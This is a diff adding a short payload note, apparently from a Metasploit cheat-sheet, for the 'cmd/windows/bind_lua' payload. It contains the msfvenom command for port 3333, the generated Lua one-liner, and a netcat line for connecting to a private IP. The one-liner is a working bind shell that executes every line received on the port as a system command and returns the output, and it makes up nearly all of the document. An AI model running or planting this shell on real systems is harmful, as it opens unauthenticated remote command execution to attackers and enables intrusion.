@@ -1,0 +1,25 @@
+cmd/windows/bind_lua
+
+
+msfvenom.bat -p cmd/windows/bind_lua LPORT=3333
+
+
+lua -e "local s=require('socket');local s=assert(socket.bind('*',3333));local c=s:accept();while true do local r,x=c:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));c:send(b);end;c:close();f:close();"
+
+nc 192.168.138.140 3333
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
